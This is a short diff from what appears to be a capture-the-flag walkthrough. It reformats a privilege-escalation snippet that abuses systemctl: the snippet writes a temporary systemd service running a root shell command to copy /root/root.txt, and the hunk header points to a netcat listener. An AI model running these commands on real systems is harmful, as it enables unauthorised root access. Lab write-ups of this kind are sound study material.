@@ -30,7 +30,8 @@ nc -lvp 1234
 * escalate privilage by systemctl
 
 ```sh
-eop=$(mktemp).serviceecho '[Service]
+eop=$(mktemp).service
+echo '[Service]
 ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
 [Install]
 WantedBy=multi-user.target' >$eop/bin/systemctl link $eop
